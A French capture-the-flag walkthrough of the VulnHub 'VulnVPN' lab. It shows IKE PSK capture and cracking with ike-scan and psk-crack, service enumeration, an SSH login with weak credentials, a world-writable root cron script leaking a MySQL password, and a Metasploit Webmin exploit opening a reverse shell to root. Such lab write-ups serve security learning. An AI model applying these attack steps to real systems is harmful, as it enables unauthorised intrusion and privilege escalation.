# Solution du CTF HackLAB : VulnVPN

Présentation
------------

[VulnVPN](http://vulnhub.com/entry/hacklab-vulnvpn,49/) est un CTF faisant partie de la série des *HackLAB* proposée sur *VulnHub*.
J'ai déjà eu l'occasion de me mesurer au [Vulnix](http://devloop.users.sourceforge.net/index.php?article95/solution-du-ctf-hacklab-vulnix) dans la même série.  

Celui-ci propose, comme son nom l'indique, de s'attaquer à un VPN. C'est le seul challenge de ce type sur *VulnHub* donc l'occasion rêvée de découvrir le hacking de VPN.  

En plus de la VM vulnérable on dispose tout de même aussi de fichiers de configuration pour mettre en place un client VPN.  

Il s'agit ici de la configuration *ipsec* et *xl2tpd*. Vous aurez alors besoin d'installer sur votre système les paquets *Openswan* et *XL2TP*.  

En ce qui me concerne j'ai trouvé des paquets *Openswan* pour mon système via *software.opensuse.org*. Les paquets ne sont pas sur des dépôts officiels ce qui laisse présumer (peut être à tort) qu'*Openswan* est en perte de vitesse face à des concurrents comme *StrongSwan* et *OpenVPN*.  

La VM est configurée avec l'IP statique 192.168.0.10. Les fichiers de configuration pour la partie cliente utilisent 192.168.0.11.  

J'ai préféré configurer la VM en host-only et définir l'interface vmnet1 à 192.168.0.11 pour faciliter la mise en place du réseau.  

Cassage de la clé VPN
---------------------

Bien que l'on dispose des fichiers de configuration, ces derniers sont volontairement incomplets : il manque la clé PSK dans le fichier *ipsec.secrets*.  

En terme d'attaque de VPN les outils plus classiques comme *THC-Hydra* et *Medusa* se révèlent inutiles. Je me suis tourné vers *ike-scan* car c'est le seul donc j'ai entendu parler sur le sujet.  

Après quelques recherches sur le web et la lecture de la manpage je trouve les options nécessaires pour récupérer la clé PSK chiffrée et l'exporter dans un fichier key (note : il faut être root car le port source 500 est utilisé) :  

```plain
# ./ike-scan -A -M -I ike-vendor-ids -Pkey 192.168.0.10 
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
192.168.0.10    Aggressive Mode Handshake returned
        HDR=(CKY-R=dc4596da0caf97d6)
        SA=(Enc=3DES Hash=SHA1 Auth=PSK Group=2:modp1024 LifeType=Seconds LifeDuration(4)=0x00007080)
        KeyExchange(128 bytes)
        Nonce(16 bytes)
        ID(Type=ID_IPV4_ADDR, Value=192.168.0.10)
        Hash(20 bytes)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9: 1 hosts scanned in 0.007 seconds (148.61 hosts/sec).  1 returned handshake; 0 returned notify
```

On utilise ensuite l'outil *psk-crack* qui fait partie d'*ike-scan* :  

```plain
# ./psk-crack -d psk-crack-dictionary key 
Starting psk-crack [ike-scan 1.9] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "123456" matches SHA1 hash 3d0062d2d5565a9ab9b9c6cba66cdd62c8d4cfc0
Ending psk-crack: 36 iterations in 0.000 seconds (89330.02 iterations/sec)
```

La clé PSK est *123456*. On corrige le fichier *ipsec.secrets* et on lance le service *ipsec*. On lance ensuite spécifiquement la connexion VPN spécifiée dans les fichiers de configuration (nommée ici *vpn*) :  

```plain
# systemctl start ipsec
# ipsec auto --up vpn
003 "vpn" #1: multiple DH groups were set in aggressive mode. Only first one used.
003 "vpn" #1: transform (7,1,2,256) ignored.
003 "vpn" #1: multiple DH groups were set in aggressive mode. Only first one used.
003 "vpn" #1: transform (7,1,2,256) ignored.
112 "vpn" #1: STATE_AGGR_I1: initiate
003 "vpn" #1: received Vendor ID payload [Dead Peer Detection]
003 "vpn" #1: received Vendor ID payload [RFC 3947] method set to=115 
003 "vpn" #1: NAT-Traversal: Result using draft-ietf-ipsec-nat-t-ike (MacOS X): no NAT detected
004 "vpn" #1: STATE_AGGR_I2: sent AI2, ISAKMP SA established {auth=OAKLEY_PRESHARED_KEY cipher=aes_256 prf=oakley_md5 group=modp1536}
117 "vpn" #2: STATE_QUICK_I1: initiate
004 "vpn" #2: STATE_QUICK_I2: sent QI2, IPsec SA established transport mode {ESP=>0xfa9f345f <0x8f740735 xfrm=AES_256-HMAC_SHA1 NATOA=none NATD=none DPD=none}
```

On note que la connexion est bien établie en mode transport.  

On procède à la suite des instructions comme indiqué sur la page du challenge :  

```plain
# systemctl start xl2tpd
# ./start-vpn.sh
```

Au boût de quelques secondes une nouvelle interface réseau est apparue :  

```plain
ppp0      Link encap:Point-to-Point Protocol  
          inet addr:10.99.99.2  P-t-P:10.99.99.1  Mask:255.255.255.255
          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1280  Metric:1
          RX packets:5 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:3 
          RX bytes:61 (61.0 b)  TX bytes:40 (40.0 b)
```

Enumeration des services
------------------------

Auparavant la VM ne semblait disposer que du port 81 ouvert. Maintenant si on relance un scan de ports :  

```plain
Nmap scan report for 10.99.99.1
Host is up (0.00036s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e0:3e:c4:37:75:87:c4:7f:5e:4b:2a:5e:f9:95:ab:7e (DSA)
|   2048 64:0e:35:86:0a:44:c5:37:c3:da:c5:64:37:b7:dc:de (RSA)
|_  256 ec:56:85:f2:5a:cc:64:2a:bb:a4:20:24:a5:6d:fd:1e (ECDSA)
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: vulnvpn, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=vulnvpn
| Not valid before: 2013-02-02T19:07:45+00:00
|_Not valid after:  2023-01-31T19:07:45+00:00
|_ssl-date: 2014-09-26T00:13:37+00:00; -17h14m09s from local time.
80/tcp    open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
81/tcp    open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      40471/udp  mountd
|   100005  1,2,3      42801/tcp  mountd
|   100021  1,3,4      33673/udp  nlockmgr
|   100021  1,3,4      59407/tcp  nlockmgr
|   100024  1          37719/tcp  status
|   100024  1          42689/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      40471/udp  mountd
|   100005  1,2,3      42801/tcp  mountd
|   100021  1,3,4      33673/udp  nlockmgr
|   100021  1,3,4      59407/tcp  nlockmgr
|   100024  1          37719/tcp  status
|   100024  1          42689/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
10000/tcp open  http     MiniServ 1.590 (Webmin httpd)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| ndmp-version: 
|_  ERROR: Failed to get host information from server
37433/tcp open  mountd   1-3 (RPC #100005)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      40471/udp  mountd
|   100005  1,2,3      42801/tcp  mountd
|   100021  1,3,4      33673/udp  nlockmgr
|   100021  1,3,4      59407/tcp  nlockmgr
|   100024  1          37719/tcp  status
|   100024  1          42689/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
37719/tcp open  status   1 (RPC #100024)
42801/tcp open  mountd   1-3 (RPC #100005)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      40471/udp  mountd
|   100005  1,2,3      42801/tcp  mountd
|   100021  1,3,4      33673/udp  nlockmgr
|   100021  1,3,4      59407/tcp  nlockmgr
|   100024  1          37719/tcp  status
|   100024  1          42689/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
56953/tcp open  mountd   1-3 (RPC #100005)
59407/tcp open  nlockmgr 1-4 (RPC #100021)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      40471/udp  mountd
|   100005  1,2,3      42801/tcp  mountd
|   100021  1,3,4      33673/udp  nlockmgr
|   100021  1,3,4      59407/tcp  nlockmgr
|   100024  1          37719/tcp  status
|   100024  1          42689/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
```

On note la présence d'un SSH, d'un NFS+mountd et d'un port 80 supplémentaire.  

Sur le port 80 on trouve un *wordpress* sur lequel je ne me suis pas attardé.  

Il y a un export NFS sur la machine pour l'utilisateur bob :  

```plain
# showmount -e 10.99.99.1
Export list for 10.99.99.1:
/home/bob *
```

A tout hazard j'ai essayé de me connecter en SSH avec bob/bob... bingo !  

```plain
# ssh bob@10.99.99.1
The authenticity of host '10.99.99.1 (10.99.99.1)' can't be established.
ECDSA key fingerprint is ec:56:85:f2:5a:cc:64:2a:bb:a4:20:24:a5:6d:fd:1e.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.99.99.1' (ECDSA) to the list of known hosts.
bob@10.99.99.1's password: 
Welcome to Ubuntu 12.04.2 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri Sep 26 14:43:11 BST 2014

  System load:  0.29              Processes:           105
  Usage of /:   30.3% of 3.74GB   Users logged in:     0
  Memory usage: 28%               IP address for eth0: 192.168.0.10
  Swap usage:   0%                IP address for ppp0: 10.99.99.1

  Graph this data and manage this system at https://landscape.canonical.com/

bob@vulnvpn:~$ uname -a
Linux vulnvpn 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
bob@vulnvpn:~$ find / -type f -user root -perm -o+w 2> /dev/null  | grep -v /proc
/etc/cron.daily/wp-backup.sh
bob@vulnvpn:~$ ls -l /etc/cron.daily/wp-backup.sh
-rwxrw-rw- 1 root root 90 Feb  2  2013 /etc/cron.daily/wp-backup.sh
bob@vulnvpn:~$ cat /etc/cron.daily/wp-backup.sh
mysqldump --opt -Q -u root --password='password' wordpress | gzip > /tmp/wp-backup.sql.gz
bob@vulnvpn:~$ ls -l /tmp/wp-backup.sql.gz
-rw-r--r-- 1 root root 20 Sep 24 22:23 /tmp/wp-backup.sql.gz
```

Escalade de privilèges #1
-------------------------

En moins de temps qu'il n'en faut pour dire *"chez les papous il y a des papous pouned et des papous pas pouned"* j'ai trouvé un moyen de passer root.
Le script cron *wp-backup.sh* est world writable. Il suffit d'y placer ses commandes et de patienter (les tâches journalières sont exécutées tous les jours à 6h25 d'après /etc/crontab).  

L'export wordpress se révèle être vide (gzip d'un fichier de 0 octets) donc d'aucune utilité.  

Toutefois en nous connectant avec les identifiants MySQL récupérés on retrouve le hash *$P$BvxcqU.WcR9CEJrqTPXJdAJ6SSeWVE1* pour l'utilisateur admin.  

Les caractères *$P$* indiquent un format *phpass* (en fonction d'où on place la césure on peut marquer ou pas son aversion pour le langage PHP).  

J'ai tenté de casser le hash avec *HashCat* malheureusement je n'ai eu aucun résultat.  

gcc n'est pas présent sur la machine ce qui oblige à compiler en statique 32 bits les binaires dont on a besoin puis de les envoyer via scp.  

Escalade de privilèges #2
-------------------------

Si la précédente méthode ne fonctionne pas (exemple : problème avec le FS sur la VM), on peut s'attaquer au vieux *Webmin* via un module *Metasploit* :  

```plain
msf exploit(webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  bob              yes       Webmin Password
   Proxies                    no        Use a proxy chain
   RHOST     10.99.99.1       yes       The target address
   RPORT     10000            yes       The target port
   SSL       true             yes       Use SSL
   USERNAME  bob              yes       Webmin Username
   VHOST                      no        HTTP server virtual host

Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.99.99.2       yes       The listen address
   LPORT  4444             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.

Exploit target:

   Id  Name
   --  ----
   0   Webim 1.580

msf exploit(webmin_show_cgi_exec) > exploit

[*] Started reverse handler on 10.99.99.2:4444 
[*] 10.99.99.1:10000 - Attempting to login...
[+] 10.99.99.1:10000 - Authentication successfully
[+] 10.99.99.1:10000 - Authentication successfully
[*] 10.99.99.1:10000 - Attempting to execute the payload...
[+] 10.99.99.1:10000 - Payload executed successfully
[*] Command shell session 1 opened (10.99.99.2:4444 -> 10.99.99.1:37505) at 2014-09-27 09:29:38 +0200

bash: no job control in this shell
root@vulnvpn:/usr/share/webmin/file/# id     
id
uid=0(root) gid=0(root) groups=0(root)
root@vulnvpn:/usr/share/webmin/file/# cd /root
cd /root
root@vulnvpn:~# ls
ls
trophy.txt
root@vulnvpn:~# cat trophy.txt    
cat trophy.txt
6dbabffbbabf0868f3bdcf3b192a3511
```

C'est plus bourrin mais plus besoin d'attendre 6h25 :)

*Published September 28 2014 at 14:51*